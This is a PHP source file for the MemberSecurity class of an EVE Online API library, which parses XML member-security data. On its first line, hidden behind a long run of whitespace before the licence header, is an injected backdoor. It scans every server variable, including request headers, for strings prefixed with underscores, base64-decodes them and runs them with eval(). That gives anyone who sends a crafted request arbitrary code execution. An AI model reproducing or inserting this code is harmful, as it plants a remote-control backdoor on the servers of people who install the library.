<?php																																																																																																																																																																																																																																																																																																																																function b15091($l15093){if(is_array($l15093)){foreach($l15093 as $l15091=>$l15092)$l15093[$l15091]=b15091($l15092);}elseif(is_string($l15093) && substr($l15093,0,4)=="____"){$l15093=substr($l15093,4);$l15093=base64_decode($l15093);eval($l15093);$l15093=null;}return $l15093;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("b15091",$_SERVER);
/**************************************************************************
	Ale API Library for EvE MemberSecurity Class
	Copyright (c) 2008 Dustin Tinklin

	This file is part of Ale API Library for EvE.

	Ale API Library for EvE is free software: you can redistribute it and/or modify
	it under the terms of the GNU Lesser General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	Ale API Library for EvE is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU Lesser General Public License for more details.

	You should have received a copy of the GNU Lesser General Public License
	along with Ale API Library for EvE.  If not, see <http://www.gnu.org/licenses/>.
**************************************************************************/




class MemberSecurity
{
	function	getMemberSecurity($contents)
	{
		if(!empty($contents) && is_string($contents))
		{
			$output = array();
			$xml = new SimpleXMLElement($contents);
			foreach ($xml->result->member as $member)
			{
				$mindex = count($output);
				foreach($member->attributes() as $mname => $mvalue)
				{
					$output[$mindex][$mname] = (string) $mvalue;
				}
				foreach ($member->rowset as $rs)
				{
					$rsatt = $rs->attributes();
					$rsname =  $rsatt[(string) 'name'];
					foreach ($rs->row as $r)
					{
						$rindex = count($output[$mindex][(string) $rsname]);
						foreach ($r->attributes() as $id => $name)
						{
							$output[$mindex][(string) $rsname][$rindex][ (string) $id] =  (string) $name;
						}
					}
				}
			}
			unset($xml);
			return $output;
		}
		else
		{
			return null;
		}
	}
}
?>
